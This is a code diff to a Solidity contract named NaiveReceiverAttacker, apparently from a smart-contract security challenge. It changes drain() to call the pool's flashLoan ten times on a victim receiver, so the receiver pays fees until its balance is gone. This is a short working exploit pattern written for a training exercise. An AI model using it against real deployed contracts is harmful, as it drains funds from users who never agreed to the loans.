@@ -11,7 +11,9 @@ contract NaiveReceiverAttacker {
     }
 
     function drain() external {
-        pool.flashLoan(receiver, 0);
+        for (uint256 index = 0; index < 10; index++) {
+            pool.flashLoan(receiver, 0);
+        }
     }
 }
 
